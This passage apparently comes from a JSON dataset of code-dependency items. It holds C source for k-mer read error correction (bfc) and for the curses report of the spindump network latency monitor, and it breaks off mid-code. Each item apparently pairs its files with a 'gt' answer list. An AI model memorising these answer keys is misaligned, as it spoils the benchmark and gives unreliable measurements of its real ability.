&s->a[i];\n\t\tc->high_end = c->solid_end = c->lcov = c->hcov = 0;\n\t\tif (c->b < 4) {\n\t\t\tbfc_kmer_append(k, x.x, c->b);\n\t\t\tif (++l >= k) {\n\t\t\t\tif ((r = bfc_ch_kmer_occ(ch, &x)) >= 0) {\n\t\t\t\t\tif ((r>>8&0x3f) >= min_occ+1) c->high_end = 1;\n\t\t\t\t\tif ((r&0xff) >= min_occ) {\n\t\t\t\t\t\tc->solid_end = 1;\n\t\t\t\t\t\tfor (j = i - k + 1; j <= i; ++j)\n\t\t\t\t\t\t\t++s->a[j].lcov, s->a[j].hcov += c->high_end;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} else l = 0, x = bfc_kmer_null;\n\t}\n}\n\nuint64_t bfc_ec_best_island(int k, const ecseq_t *s)\n{\n\tint i, l, max, max_i;\n\tfor (i = k - 1, max = l = 0, max_i = -1; i < s->n; ++i) {\n\t\tif (!s->a[i].solid_end) {\n\t\t\tif (l > max) max = l, max_i = i;\n\t\t\tl = 0;\n\t\t} else ++l;\n\t}\n\tif (l > max) max = l, max_i = i;\n\treturn max > 0? (uint64_t)(max_i - max - k + 1) << 32 | max_i : 0;\n}\n\n\n\n#include \"ksort.h\"\n\n#define ECCODE_MISC      1\n#define ECCODE_MANY_N    2\n#define ECCODE_NO_SOLID  3\n#define ECCODE_UNCORR_N  4\n#define ECCODE_MANY_FAIL 5\n\ntypedef struct {\n\tuint32_t ec_code:3, brute:1, n_ec:14, n_ec_high:14;\n\tuint32_t n_absent:24, max_heap:8;\n} ecstat_t;\n\ntypedef struct {\n\tuint8_t ec:1, ec_high:1, absent:1, absent_high:1, b:4;\n} bfc_penalty_t;\n\ntypedef struct {\n\tint tot_pen;\n\tint i;\n\tint k;\n\tint32_t ecpos_high[BFC_EC_HIST_HIGH];\n\tint32_t ecpos[BFC_EC_HIST];\n\tbfc_kmer_t x;\n} echeap1_t;\n\ntypedef struct {\n\tint parent, i, tot_pen;\n\tuint8_t b;\n\tbfc_penalty_t pen;\n\tuint16_t cnt;\n} ecstack1_t;\n\ntypedef struct {\n\tconst bfc_opt_t *opt;\n\tconst bfc_ch_t *ch;\n\tkvec_t(echeap1_t) heap;\n\tkvec_t(ecstack1_t) stack;\n\tecseq_t seq, tmp, ec[2];\n\tint mode;\n\tecstat_t ori_st;\n} bfc_ec1buf_t;\n\n#define heap_lt(a, b) ((a).tot_pen > (b).tot_pen)\nKSORT_INIT(ec, echeap1_t, heap_lt)\n\nstatic bfc_ec1buf_t *ec1buf_init(const bfc_opt_t *opt, const bfc_ch_t *ch)\n{\n\tbfc_ec1buf_t *e;\n\te = calloc(1, sizeof(bfc_ec1buf_t));\n\te->opt = opt, e->ch = ch;\n\treturn e;\n}\n\nstatic void ec1buf_destroy(bfc_ec1buf_t *e)\n{\n\tfree(e->heap.a); free(e->stack.a); free(e->seq.a); free(e->tmp.a); free(e->ec[0].a); free(e->ec[1].a);\n\tfree(e);\n}\n\n#define weighted_penalty(o, p) ((o)->w_ec * (p).ec + (o)->w_ec_high * (p).ec_high + (o)->w_absent * (p).absent + (o)->w_absent_high * (p).absent_high)\n\nstatic void buf_update(bfc_ec1buf_t *e, const echeap1_t *prev, bfc_penalty_t pen, int cnt)\n{\n\tecstack1_t *q;\n\techeap1_t *r;\n\tconst bfc_opt_t *o = e->opt;\n\tint b = pen.b;\n\n\tkv_pushp(ecstack1_t, e->stack, &q);\n\tq->parent = prev->k;\n\tq->i = prev->i;\n\tq->b = b;\n\tq->pen = pen;\n\tq->cnt = cnt > 0? cnt&0xff : 0;\n\tq->tot_pen = prev->tot_pen + weighted_penalty(o, pen);\n\n\tkv_pushp(echeap1_t, e->heap, &r);\n\tr->i = prev->i + 1;\n\tr->k = e->stack.n - 1;\n\tr->x = prev->x;\n\tif (pen.ec_high) {\n\t\tmemcpy(r->ecpos_high + 1, prev->ecpos_high, (BFC_EC_HIST_HIGH - 1) * 4);\n\t\tr->ecpos_high[0] = prev->i;\n\t} else memcpy(r->ecpos_high, prev->ecpos_high, BFC_EC_HIST_HIGH * 4);\n\tif (pen.ec) {\n\t\tmemcpy(r->ecpos + 1, prev->ecpos, (BFC_EC_HIST - 1) * 4);\n\t\tr->ecpos[0] = prev->i;\n\t} else memcpy(r->ecpos, prev->ecpos, BFC_EC_HIST * 4);\n\tr->tot_pen = q->tot_pen;\n\tbfc_kmer_append(e->opt->k, r->x.x, b);\n\tks_heapup_ec(e->heap.n, e->heap.a);\n}\n\nstatic int buf_backtrack(ecstack1_t *s, int end, const ecseq_t *seq, ecseq_t *path)\n{\n\tint i, n_absent = 0;\n\tkv_resize(ecbase_t, *path, seq->n);\n\tpath->n = seq->n;\n\twhile (end >= 0) {\n\t\tif ((i = s[end].i) < seq->n) {\n\t\t\tpath->a[i].b = s[end].b;\n\t\t\tpath->a[i].ec = s[end].pen.ec;\n\t\t\tpath->a[i].absent = s[end].pen.absent;\n\t\t\tn_absent += s[end].pen.absent;\n\t\t}\n\t\tend = s[end].parent;\n\t}\n\treturn n_absent;\n}\n\nstatic int bfc_ec1dir(bfc_ec1buf_t *e, const ecseq_t *seq, ecseq_t *ec, int start, int end, int *max_heap)\n{\n\techeap1_t z;\n\tint i, l, rv = -1, path[BFC_MAX_PATHS], n_paths = 0, min_path = -1, min_path_pen = INT_MAX, n_failures = 0;\n\tassert(end <= seq->n && end - start >= e->opt->k);\n\te->heap.n = e->stack.n = 0;\n\t*max_heap = 0;\n\tmemset(&z, 0, sizeof(echeap1_t));\n\tkv_resize(ecbase_t, *ec, seq->n);\n\tec->n = seq->n;\n\tfor (z.i = start, l = 0; z.i < end; ++z.i) {\n\t\tint c = seq->a[z.i].b;\n\t\tif (c < 4) {\n\t\t\tif (++l == e->opt->k) break;\n\t\t\tbfc_kmer_append(e->opt->k, z.x.x, c);\n\t\t} else l = 0, z.x = bfc_kmer_null;\n\t}\n\tassert(z.i < end);\n\tz.k = -1;\n\tfor (i = 0; i < BFC_EC_HIST; ++i) z.ecpos[i] = -1;\n\tfor (i = 0; i < BFC_EC_HIST_HIGH; ++i) z.ecpos_high[i] = -1;\n\tkv_push(echeap1_t, e->heap, z);\n\tfor (i = 0; i < seq->n; ++i) ec->a[i].b = seq->a[i].b, ec->a[i].ob = seq->a[i].ob;\n\n\twhile (1) {\n\t\tint stop = 0;\n\t\t*max_heap = *max_heap > 255? 255 : *max_heap > e->heap.n? *max_heap : e->heap.n;\n\t\tif (e->heap.n == 0) {\n\t\t\trv = -2;\n\t\t\tbreak;\n\t\t}\n\t\tz = e->heap.a[0];\n\t\te->heap.a[0] = kv_pop(e->heap);\n\t\tks_heapdown_ec(0, e->heap.n, e->heap.a);\n\t\tif (min_path >= 0 && z.tot_pen > min_path_pen + e->opt->max_path_diff) break;\n\t\tif (z.i - end > e->opt->max_end_ext) stop = 1;\n\t\tif (!stop) {\n\t\t\tecbase_t *c = z.i < seq->n? &seq->a[z.i] : 0;\n\t\t\tint b, os = -1, fixed = 0, other_ext = 0, n_added = 0, added_cnt[4];\n\t\t\tbfc_penalty_t added[4];\n\n\t\t\tif (z.i > end) fixed = 1;\n\t\t\tif (c && c->b < 4) {\n\t\t\t\tbfc_kmer_t x = z.x;\n\t\t\t\tbfc_kmer_append(e->opt->k, x.x, c->b);\n\t\t\t\tos = bfc_ch_kmer_occ(e->ch, &x);\n\t\t\t\tif (c->q && (os&0xff) >= e->opt->min_cov + 1 && c->lcov >= e->opt->min_cov + 1) fixed = 1;\n\t\t\t\telse if (c->hcov > e->opt->k * .75) fixed = 1;\n\t\t\t}\n\n\t\t\tfor (b = 0; b < 4; ++b) {\n\t\t\t\tbfc_penalty_t pen;\n\t\t\t\tif (fixed && c && b != c->b) continue;\n\t\t\t\tif (c == 0 || b != c->b) {\n\t\t\t\t\tint s;\n\t\t\t\t\tbfc_kmer_t x = z.x;\n\t\t\t\t\tpen.ec = 0, pen.ec_high = 0, pen.absent = 0, pen.absent_high = 0, pen.b = b;\n\t\t\t\t\tif (c) {\n\t\t\t\t\t\tif (c->q && z.ecpos_high[BFC_EC_HIST_HIGH-1] >= 0 && z.i - z.ecpos_high[BFC_EC_HIST_HIGH-1] < e->opt->win_multi_ec) continue;\n\t\t\t\t\t\tif (z.ecpos[BFC_EC_HIST-1] >= 0 && z.i - z.ecpos[BFC_EC_HIST-1] < e->opt->win_multi_ec) continue;\n\t\t\t\t\t}\n\t\t\t\t\tbfc_kmer_append(e->opt->k, x.x, b);\n\t\t\t\t\ts = bfc_ch_kmer_occ(e->ch, &x);\n\t\t\t\t\tif (s < 0 || (s&0xff) < e->opt->min_cov) continue;\n\n\t\t\t\t\tpen.ec = c && c->b < 4? 1 : 0;\n\t\t\t\t\tpen.ec_high = pen.ec? c->oq : 0;\n\t\t\t\t\tpen.absent = 0;\n\t\t\t\t\tpen.absent_high = ((s>>8&0xff) < e->opt->min_cov);\n\t\t\t\t\tpen.b = b;\n\t\t\t\t\tadded_cnt[n_added] = s;\n\t\t\t\t\tadded[n_added++] = pen;\n\t\t\t\t\t++other_ext;\n\t\t\t\t} else {\n\t\t\t\t\tpen.ec = pen.ec_high = 0;\n\t\t\t\t\tpen.absent = (os < 0 || (os&0xff) < e->opt->min_cov);\n\t\t\t\t\tpen.absent_high = (os < 0 || (os>>8&0xff) < e->opt->min_cov);\n\t\t\t\t\tpen.b = b;\n\t\t\t\t\tadded_cnt[n_added] = os;\n\t\t\t\t\tadded[n_added++] = pen;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (fixed == 0 && other_ext == 0) ++n_failures;\n\t\t\tif (n_failures > seq->n * 2) {\n\t\t\t\trv = -3;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (c || n_added == 1) {\n\t\t\t\tif (n_added > 1 && e->heap.n > e->opt->max_heap) {\n\t\t\t\t\tint min_b = -1, min = INT_MAX;\n\t\t\t\t\tfor (b = 0; b < n_added; ++b) {\n\t\t\t\t\t\tint t = weighted_penalty(e->opt, added[b]);\n\t\t\t\t\t\tif (min > t) min = t, min_b = b;\n\t\t\t\t\t}\n\t\t\t\t\tbuf_update(e, &z, added[min_b], added_cnt[min_b]);\n\t\t\t\t} else {\n\t\t\t\t\tfor (b = 0; b < n_added; ++b)\n\t\t\t\t\t\tbuf_update(e, &z, added[b], added_cnt[b]);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tif (n_added == 0)\n\t\t\t\t\te->stack.a[z.k].tot_pen += e->opt->w_absent * (e->opt->max_end_ext - (z.i - end));\n\t\t\t\tstop = 1;\n\t\t\t}\n\t\t}\n\t\tif (stop) {\n\t\t\tif (e->stack.a[z.k].tot_pen < min_path_pen)\n\t\t\t\tmin_path_pen = e->stack.a[z.k].tot_pen, min_path = n_paths;\n\t\t\tpath[n_paths++] = z.k;\n\t\t\tif (n_paths == BFC_MAX_PATHS) break;\n\t\t}\n\t}\n\n\tif (n_paths == 0) return rv;\n\tassert(min_path >= 0 && min_path < n_paths && e->stack.a[path[min_path]].tot_pen == min_path_pen);\n\trv = buf_backtrack(e->stack.a, path[min_path], seq, ec);\n\tfor (i = 0; i < ec->n; ++i)\n\t\tif (i < start + e->opt->k || i >= end) ec->a[i].b = 4;\n\treturn rv;\n}\n\necstat_t bfc_ec1(bfc_ec1buf_t *e, char *seq, char *qual)\n{\n\tint i, start = 0, end = 0, n_n = 0, rv[2], max_heap[2];\n\tuint64_t r;\n\tecstat_t s;\n\n\ts.ec_code = ECCODE_MISC, s.brute = 0, s.n_ec = s.n_ec_high = 0, s.n_absent = s.max_heap = 0;\n\tbfc_seq_conv(seq, qual, e->opt->q, &e->seq);\n\tfor (i = 0; i < e->seq.n; ++i)\n\t\tif (e->seq.a[i].ob > 3) ++n_n;\n\tif (n_n > e->seq.n * .05) {\n\t\ts.ec_code = ECCODE_MANY_N;\n\t\treturn s;\n\t}\n\tbfc_ec_kcov(e->opt->k, e->opt->min_cov, &e->seq, e->ch);\n\tr = bfc_ec_best_island(e->opt->k, &e->seq);\n\tif (r == 0) {\n\t\tbfc_kmer_t x;\n\t\tint ec = -1;\n\t\twhile ((end = bfc_ec_first_kmer(e->opt->k, &e->seq, start, &x)) < e->seq.n) {\n\t\t\tec = bfc_ec_greedy_k(e->opt->k, e->mode, &x, e->ch);\n\t\t\tif (ec >= 0) break;\n\t\t\tif (end + (e->opt->k>>1) >= e->seq.n) break;\n\t\t\tstart = end - (e->opt->k>>1);\n\t\t}\n\t\tif (ec >= 0) {\n\t\t\te->seq.a[end - (ec>>2)].b = ec&3;\n\t\t\t++end; start = end - e->opt->k;\n\t\t\ts.brute = 1;\n\t\t} else {\n\t\t\ts.ec_code = ECCODE_NO_SOLID;\n\t\t\treturn s;\n\t\t}\n\t} else start = r>>32, end = (uint32_t)r;\n\tif ((rv[0] = bfc_ec1dir(e, &e->seq, &e->ec[0], start, e->seq.n, &max_heap[0])) < 0) {\n\t\ts.ec_code = rv[0] == -2? ECCODE_UNCORR_N : rv[0] == -3? ECCODE_MANY_FAIL : ECCODE_MISC;\n\t\treturn s;\n\t}\n\tbfc_seq_revcomp(&e->seq);\n\tif ((rv[1] = bfc_ec1dir(e, &e->seq, &e->ec[1], e->seq.n - end, e->seq.n, &max_heap[1])) < 0) {\n\t\ts.ec_code = rv[1] == -2? ECCODE_UNCORR_N : rv[1] == -3? ECCODE_MANY_FAIL : ECCODE_MISC;\n\t\treturn s;\n\t}\n\ts.max_heap = max_heap[0] > max_heap[1]? max_heap[0] : max_heap[1];\n\ts.ec_code = 0, s.n_absent = rv[0] + rv[1];\n\tbfc_seq_revcomp(&e->ec[1]);\n\tbfc_seq_revcomp(&e->seq);\n\tfor (i = 0; i < e->seq.n; ++i) {\n\t\tecbase_t *c = &e->seq.a[i];\n\t\tif (e->ec[0].a[i].b == e->ec[1].a[i].b)\n\t\t\tc->b = e->ec[0].a[i].b > 3? e->seq.a[i].b : e->ec[0].a[i].b;\n\t\telse if (e->ec[1].a[i].b > 3) c->b = e->ec[0].a[i].b;\n\t\telse if (e->ec[0].a[i].b > 3) c->b = e->ec[1].a[i].b;\n\t\telse c->b = e->seq.a[i].ob;\n\t}\n\tfor (i = 0; i < e->seq.n; ++i) {\n\t\tint is_diff = !(e->seq.a[i].b == e->seq.a[i].ob);\n\t\tif (is_diff) {\n\t\t\t++s.n_ec;\n\t\t\tif (e->seq.a[i].q) ++s.n_ec_high;\n\t\t}\n\t\tseq[i] = (is_diff? \"acgtn\" : \"ACGTN\")[e->seq.a[i].b];\n\t\tif (qual) qual[i] = is_diff? 34 + e->seq.a[i].ob : \"+?\"[e->seq.a[i].q];\n\t}\n\treturn s;\n}\n\n\n\ntypedef struct {\n\tconst bfc_opt_t *opt;\n\tconst bfc_ch_t *ch;\n\tbfc_ec1buf_t **e;\n\tint64_t n_processed;\n\tint n_seqs, flt_uniq;\n\tbseq1_t *seqs;\n} ec_step_t;\n\nstatic uint64_t max_streak(int k, const bfc_ch_t *ch, const bseq1_t *s)\n{\n\tint i, l;\n\tuint64_t max = 0, t = 0;\n\tbfc_kmer_t x = bfc_kmer_null;\n\tfor (i = l = 0; i < s->l_seq; ++i) {\n\t\tint c = seq_nt6_table[(uint8_t)s->seq[i]] - 1;\n\t\tif (c < 4) {\n\t\t\tbfc_kmer_append(k, x.x, c);\n\t\t\tif (++l >= k) {\n\t\t\t\tif (bfc_ch_kmer_occ(ch, &x) > 0) t += 1ULL<<32;\n\t\t\t\telse t = i + 1;\n\t\t\t} else t = i + 1;\n\t\t} else l = 0, x = bfc_kmer_null, t = i + 1;\n\t\tmax = max > t? max : t;\n\t}\n\treturn max;\n}\n\nstatic void worker_ec(void *_data, long k, int tid)\n{\n\tec_step_t *es = (ec_step_t*)_data;\n\tbseq1_t *s = &es->seqs[k];\n\tif (es->flt_uniq) {\n\t\tuint64_t max;\n\t\tmax = max_streak(es->opt->k, es->ch, s);\n\t\tif (max>>32 && (double)((max>>32) + es->opt->k - 1) / s->l_seq > es->opt->min_trim_frac) {\n\t\t\tint start = (uint32_t)max, end = start + (max>>32);\n\t\t\tstart -= es->opt->k - 1;\n\t\t\tassert(start >= 0 && end <= s->l_seq);\n\t\t\tmemmove(s->seq, s->seq + start, end - start);\n\t\t\ts->l_seq = end - start;\n\t\t\ts->seq[s->l_seq] = 0;\n\t\t\tif (s->qual) {\n\t\t\t\tmemmove(s->qual, s->qual + start, s->l_seq);\n\t\t\t\ts->qual[s->l_seq] = 0;\n\t\t\t}\n\t\t} else {\n\n\n\t\t}\n\t} else bfc_ec1(es->e[tid], s->seq, s->qual);\n}\n\nfloat fml_correct_core(const fml_opt_t *opt, int flt_uniq, int n, bseq1_t *seq)\n{\n\tbfc_ch_t *ch;\n\tint i, mode;\n\tuint64_t hist[256], hist_high[64], tot_len = 0, sum_k = 0, tot_k = 0;\n\tec_step_t es;\n\tbfc_opt_t bfc_opt;\n\tfloat kcov;\n\n\n\tbfc_opt_init(&bfc_opt);\n\tbfc_opt.n_threads = opt->n_threads;\n\tbfc_opt.k = flt_uniq? opt->min_asm_ovlp : opt->ec_k;\n\tfor (i = 0; i < n; ++i) tot_len += seq[i].l_seq;\n\tbfc_opt.l_pre = tot_len - 8 < 20? tot_len - 8 : 20;\n\n\tmemset(&es, 0, sizeof(ec_step_t));\n\tes.opt = &bfc_opt, es.n_seqs = n, es.seqs = seq, es.flt_uniq = flt_uniq;\n\n\tes.ch = ch = fml_count(n, seq, bfc_opt.k, bfc_opt.q, bfc_opt.l_pre, bfc_opt.n_threads);\n\tmode = bfc_ch_hist(ch, hist, hist_high);\n\tfor (i = opt->min_cnt; i < 256; ++i)\n\t\tsum_k += hist[i], tot_k += i * hist[i];\n\tkcov = (float)tot_k / sum_k;\n\tbfc_opt.min_cov = (int)(BFC_EC_MIN_COV_COEF * kcov + .499);\n\tbfc_opt.min_cov = bfc_opt.min_cov < opt->max_cnt? bfc_opt.min_cov : opt->max_cnt;\n\tbfc_opt.min_cov = bfc_opt.min_cov > opt->min_cnt? bfc_opt.min_cov : opt->min_cnt;\n\n\tes.e = calloc(es.opt->n_threads, sizeof(void*));\n\tfor (i = 0; i < es.opt->n_threads; ++i)\n\t\tes.e[i] = ec1buf_init(es.opt, ch), es.e[i]->mode = mode;\n\tkt_for(es.opt->n_threads, worker_ec, &es, es.n_seqs);\n\tfor (i = 0; i < es.opt->n_threads; ++i)\n\t\tec1buf_destroy(es.e[i]);\n\tfree(es.e);\n\tbfc_ch_destroy(ch);\n\treturn kcov;\n}\n\nfloat fml_correct(const fml_opt_t *opt, int n, bseq1_t *seq)\n{\n\treturn fml_correct_core(opt, 0, n, seq);\n}\n\nfloat fml_fltuniq(const fml_opt_t *opt, int n, bseq1_t *seq)\n{\n\treturn fml_correct_core(opt, 1, n, seq);\n}\n",
        "gt": [
            "'bio-playground/nim-stuffs/fermil-nim/fml.h'",
            "'bio-playground/nim-stuffs/fermil-nim/internal.h'",
            "'bio-playground/nim-stuffs/fermil-nim/bfc.c'"
        ]
    },
    {
        "files": [
            "'spindump/src/spindump_table.h'",
            "'spindump/src/spindump_table_structs.h'",
            "'spindump/src/spindump_report.h'",
            "'spindump/src/spindump_report.c'"
        ],
        "content": "'spindump/src/spindump_table.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef SPINDUMP_TABLE_H\n#define SPINDUMP_TABLE_H\n\n\n\n\n\n#include <stdlib.h>\n#include <time.h>\n#include <sys/time.h>\n#include \"spindump_tags.h\"\n#include \"spindump_table_structs.h\"\n#include \"spindump_connections_structs.h\"\n#include \"spindump_stats.h\"\n#include \"spindump_reversedns.h\"\n\n\n\n\n\nstruct spindump_analyze;\n\n\n\n\n\nstruct spindump_connectionstable*\nspindump_connectionstable_initialize(unsigned long long bandwidthMeasurementPeriod,\n                                     unsigned int periodicReportPeriod,\n                                     const spindump_tags* defaultTags);\nvoid\nspindump_connectionstable_uninitialize(struct spindump_connectionstable* table);\nint\nspindump_connectionstable_periodiccheck(struct spindump_connectionstable* table,\n                                        const struct timeval* now,\n                                        struct spindump_analyze* analyzer,\n                                        int print_info);\nvoid\nspindump_connectionstable_deleteconnection(struct spindump_connection* connection,\n                                           struct spindump_connectionstable* table,\n                                           struct spindump_analyze* analyzer,\n                                           const char* reason,\n                                           int print_info);\nvoid\nspindump_connectionstable_report(struct spindump_connectionstable* table,\n                                 FILE* file,\n                                 int anonymize,\n                                 struct spindump_reverse_dns* querier);\n\n#endif\n\n'spindump/src/spindump_table_structs.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef SPINDUMP_TABLE_STRUCTS_H\n#define SPINDUMP_TABLE_STRUCTS_H\n\n\n\n\n\n#include <stdlib.h>\n#include <time.h>\n#include <sys/time.h>\n#include \"spindump_tags.h\"\n#include \"spindump_connections_structs.h\"\n\n\n\n\n\n#define spindump_connectionstable_defaultsize 1024\n\n\n\n\n\nstruct spindump_connectionstable {\n  unsigned long long bandwidthMeasurementPeriod;\n  unsigned int periodicReportPeriod;\n  int performingPeriodicReport;\n  struct timeval lastPeriodicCheck;\n  struct timeval lastPeriodicReport;\n  spindump_tags defaultTags;\n  unsigned int nConnections;\n  unsigned int maxNConnections;\n  struct spindump_connection** connections;\n  unsigned int nNetworks;\n  struct spindump_connection_network *networks;\n};\n\n#endif\n\n'spindump/src/spindump_report.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef SPINDUMP_REPORT_H\n#define SPINDUMP_REPORT_H\n\n\n\n\n\n#include \"spindump_connections.h\"\n#include \"spindump_table.h\"\n#include \"spindump_stats.h\"\n\n\n\n\n\n#define spindump_report_maxlinelen              400\n\n\n\n\n\nenum spindump_report_command {\n  spindump_report_command_none,\n  spindump_report_command_help,\n  spindump_report_command_toggle_average,\n  spindump_report_command_toggle_aggregate,\n  spindump_report_command_toggle_closed,\n  spindump_report_command_toggle_udp,\n  spindump_report_command_update_interval,\n  spindump_report_command_toggle_reverse_dns,\n  spindump_report_command_quit\n};\n\nenum spindump_report_destination {\n  spindump_report_destination_quiet,\n  spindump_report_destination_terminal\n};\n\nstruct spindump_report_state {\n  enum spindump_report_destination destination;\n  int inputlineposition;\n  int anonymizeLeft;\n  int anonymizeRight;\n  struct spindump_reverse_dns* querier;\n};\n\n\n\n\n\nstruct spindump_report_state*\nspindump_report_initialize_quiet(void);\nstruct spindump_report_state*\nspindump_report_initialize_terminal(struct spindump_reverse_dns* querier);\nvoid\nspindump_report_setanonymization(struct spindump_report_state* reporter,\n                                 int anonymizeLeft,\n                                 int anonymizeRight);\nvoid\nspindump_report_update(struct spindump_report_state* reporter,\n                       int average,\n                       int aggregate,\n                       int closed,\n                       int udp,\n                       int reverseDns,\n                       struct spindump_connectionstable* table,\n                       struct spindump_stats* stats);\nenum spindump_report_command\nspindump_report_checkinput(struct spindump_report_state* reporter,\n                           double* p_argument);\nvoid\nspindump_report_showhelp(struct spindump_report_state* reporter);\nvoid\nspindump_report_uninitialize(struct spindump_report_state* reporter);\n\n#endif\n\n'spindump/src/spindump_report.c'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#include <ctype.h>\n#include <stdio.h>\n#include <string.h>\n#include <locale.h>\n#include <curses.h>\n#include \"spindump_util.h\"\n#include \"spindump_report.h\"\n\n\n\n\n\nstatic void\nspindump_report_cursesinit(void);\nstatic void\nspindump_report_cursesfinish(void);\nstatic int\nspindump_report_update_comparetwoconnections(const void* data1,\n                                             const void* data2);\n\n\n\n\n\n\n\n\n\n\nstatic void\nspindump_report_cursesinit(void) {\n\n  setlocale(LC_ALL, \"\");\n  initscr();\n  cbreak();\n  noecho();\n  nonl();\n  intrflush(stdscr, FALSE);\n  keypad(stdscr, TRUE);\n  nodelay(stdscr, TRUE);\n\n}\n\n\n\n\n\n\nstatic void\nspindump_report_cursesfinish(void) {\n\n  nodelay(stdscr, FALSE);\n  keypad(stdscr, FALSE);\n  intrflush(stdscr, TRUE);\n  nl();\n  echo();\n  nocbreak();\n  refresh();\n  endwin();\n\n}\n\n\n\n\n\nstruct spindump_report_state*\nspindump_report_initialize_quiet(void) {\n\n\n\n\n\n  unsigned int size = sizeof(struct spindump_report_state);\n  struct spindump_report_state* reporter = (struct spindump_report_state*)spindump_malloc(size);\n  if (reporter == 0) {\n    spindump_errorf(\"cannot allocate reporter state of %u bytes\", size);\n    return(0);\n  }\n\n\n\n\n\n  reporter->destination = spindump_report_destination_quiet;\n  reporter->anonymizeLeft = 0;\n  reporter->anonymizeRight = 0;\n  reporter->querier = spindump_reverse_dns_initialize_noop();\n\n\n\n\n\n  return(reporter);\n}\n\n\n\n\n\n\nstruct spindump_report_state*\nspindump_report_initialize_terminal(struct spindump_reverse_dns* querier) {\n\n\n\n\n\n  spindump_assert(querier != 0);\n\n\n\n\n\n  unsigned int size = sizeof(struct spindump_report_state);\n  struct spindump_report_state* reporter = (struct spindump_report_state*)spindump_malloc(size);\n  if (reporter == 0) {\n    spindump_errorf(\"cannot allocate reporter state of %u bytes\", size);\n    return(0);\n  }\n\n\n\n\n\n  reporter->destination = spindump_report_destination_terminal;\n  reporter->anonymizeLeft = 0;\n  reporter->anonymizeRight = 0;\n  reporter->querier = querier;\n\n\n\n\n\n  spindump_report_cursesinit();\n  reporter->inputlineposition = 0;\n\n\n\n\n\n  return(reporter);\n}\n\n\n\n\n\n\nvoid\nspindump_report_setanonymization(struct spindump_report_state* reporter,\n                                 int anonymizeLeft,\n                                 int anonymizeRight) {\n  spindump_assert(reporter != 0);\n  spindump_assert(spindump_isbool(anonymizeLeft));\n  spindump_assert(spindump_isbool(anonymizeRight));\n  reporter->anonymizeLeft = anonymizeLeft;\n  reporter->anonymizeRight = anonymizeRight;\n}\n\n\n\n\n\n\n\ntypedef const struct spindump_connection* spindump_connection_constptr;\nstatic int\nspindump_report_update_comparetwoconnections(const void* data1,\n                                             const void* data2) {\n  const spindump_connection_constptr* elem1 = (const spindump_connection_constptr*)data1;\n  const spindump_connection_constptr* elem2 = (const spindump_connection_constptr*)data2;\n  const struct spindump_connection* connection1 = *elem1;\n  const struct spindump_connection* connection2 = *elem2;\n  unsigned long packets1 = connection1->packetsFromSide1 + connection1->packetsFromSide2;\n  unsigned long packets2 = connection2->packetsFromSide1 + connection2->packetsFromSide2;\n\n  if (packets1 < packets2) {\n    return(1);\n  } else if (packets1 > packets2) {\n    return(-1);\n  } else {\n    return(0);\n  }\n}\n\n\n\n\n\nvoid\nspindump_report_update(struct spindump_report_state* reporter,\n                       int average,\n                       int aggregate,\n                       int closed,\n                       int udp,\n                       int reverseDns,\n                       struct spindump_connectionstable* table,\n                       struct spindump_stats* stats) {\n\n  spindump_assert(reporter != 0);\n  spindump_assert(average == 0 || average == 1);\n  spindump_assert(aggregate == 0 || aggregate == 1);\n  spindump_assert(closed == 0 || closed == 1);\n  spindump_assert(udp == 0 || udp == 1);\n  spindump_assert(reverseDns == 0 || reverseDns == 1);\n  spindump_assert(table != 0);\n  spindump_assert(stats != 0);\n\n  if (reporter->destination == spindump_report_destination_terminal) {\n\n    char connectionsstatus[300];\n    int y = 0;\n    unsigned int i;\n\n    snprintf(connectionsstatus,sizeof(connectionsstatus)-1,\"%u connections %s packets %s bytes\",\n             table->nConnections,\n             spindump_meganumber_tostring(stats->receivedIp + stats->receivedIpv6),\n             spindump_meganumberll_tostring(stats->receivedIpBytes + stats->receivedIpv6Bytes));\n    snprintf(connectionsstatus+strlen(connectionsstatus),\n             sizeof(connectionsstatus)-strlen(connectionsstatus)-1,\n             \" (showing %s%s%s%s%s)\",\n             average    ? \"avg RTTs\"                 : \"latest RTTs\",\n             aggregate  ? \", aggregated connections\" : \"\",\n             udp        ? \"\"                         : \", not showing UDP\",\n             closed     ? \"\"                         : (udp ? \", not showing closed\" : \" or closed\"),\n             reverseDns ? \", showing names\"          : \", showing addresses\");\n\n    clear();\n\n    spindump_deepdebugf(\"report start done\");\n    if (LINES < 7 || ((unsigned int)COLS) < spindump_connection_report_brief_fixedsize((unsigned int)LINES) + 5) {\n\n      mvaddstr(y++, 0, \"TOO SMALL\");\n\n    } else {\n\n      mvaddstr(y++, 0, \"SPINDUMP   \");\n      mvaddstr(y++, 0, \"           \");\n      mvaddstr(y++, 0, connectionsstatus);\n      reporter->inputlineposition = y;\n      mvaddstr(y++, 0, \"           \");\n      char columnsbuf[spindump_report_maxlinelen];\n      unsigned int addrsiz = spindump_connection_report_brief_variablesize((unsigned int)COLS);\n      unsigned int maxsessionlen = spindump_connection_report_brief_sessionsize((unsigned int)COLS);\n      snprintf(columnsbuf,sizeof(columnsbuf)-1,\n               \"%-7s %-*s %-*s %8s %6s %10s %10s\",\n               \"TYPE\",addrsiz,\"ADDRESSES\",maxsessionlen,\"SESSION\",\"STATE\",\"PAKS\",\"LEFT RTT\",\"RIGHT RTT\");\n      if (spindump_connection_report_brief_isnotefield((unsigned int)COLS)) {\n        snprintf(columnsbuf+strlen(columnsbuf),sizeof(columnsbuf)-1-strlen(columnsbuf),\"  %-*s\",\n                 spindump_connection_report_brief_notefieldval_length(),\n                 \"NOTE\");\n      }\n      mvaddstr(y++, 0, columnsbuf);\n      mvaddstr(y++, 0, \"\");\n\n\n\n\n\n\n\n      int actualConnections = 0;\n#     define maxActualConnections 200\n      struct spindump_connection* actualTable[maxActualConnections];\n\n      spindump_deepdebugf(\"report gathering\");\n\n      reporter->querier->noop =\n          reverseDns ? 0 : 1;\n\n      for (i = 0;\n           (i < table->nConnections &&\n            actualConnections < maxActualConnections &&\n            actualConnections < (LINES - y));\n           i++) {\n        struct spindump_connection* connection = table->connections[i];\n        if (connection != 0 &&\n            ((connection->type != 